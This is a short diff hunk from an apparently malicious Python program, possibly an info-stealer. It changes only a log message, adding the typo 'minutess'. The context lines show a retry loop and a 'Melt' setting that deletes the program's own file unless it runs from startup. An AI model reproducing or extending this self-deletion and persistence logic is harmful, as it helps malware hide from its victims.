@@ -1469,7 +1469,7 @@ if os.name == 'nt':
                 if isinstance(e, KeyboardInterrupt):
                     os._exit(1)
                 Logger.critical(e, exc_info=True)
-                Logger.info('There was an error, retrying after 10 minutes')
+                Logger.info('There was an error, retrying after 10 minutess')
                 time.sleep(600)
         if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
             Logger.info('Deleting the file')
